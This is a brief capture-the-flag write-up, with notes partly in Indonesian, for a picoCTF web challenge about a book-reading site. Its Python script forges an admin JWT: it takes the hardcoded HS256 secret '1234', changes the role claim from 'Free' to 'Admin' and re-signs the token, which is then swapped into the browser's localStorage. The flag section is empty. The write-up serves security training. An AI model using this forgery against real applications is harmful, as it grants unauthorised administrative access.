<h1>Java Code Analysis!?!</h1>
<h3>Description</h3>
<pre>
BookShelf Pico, my premium online book-reading service.
I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!
Here are the credentials to get you started:
Username: "user"
Password: "user"
Source code can be downloaded <a href='https://artifacts.picoctf.net/c/480/bookshelf-pico.zip'>here</a>.
Website can be accessed <a href='http://saturn.picoctf.net:61120/'>here!</a>.
</pre>
<h3>Description</h3>
<label>Secret HS256 = 1234, cek di src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java</label><br>
<label>Cek JWT di localstorage</label>

```python
import base64
import hmac
import jwt
import hashlib

jwt = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc2MTY5NzczMiwiaWF0IjoxNzYxMDkyOTMyLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.kthTdtFMey2KufoA87CVrb3gccXdRNdc7FlwnuZPtSc'
secret = '1234'

header = base64.b64decode(jwt.split('.')[0].encode()).decode()
header_base64 = base64.urlsafe_b64encode(header.encode()).decode().rstrip("=")
payload = base64.b64decode(jwt.split('.')[1].encode()).decode().replace('Free','Admin')
payload_base64 = base64.urlsafe_b64encode(payload.encode()).decode().rstrip("=")
message = f"{header_base64}.{payload_base64}"
signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
signature_base64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")
jwt = f"{message}.{signature_base64}"
print(payload)
print(jwt)
```
<label>Ganti JWT dari localstorage dan token payload<label>
<h3>Flag</h3>
<pre>

</pre>
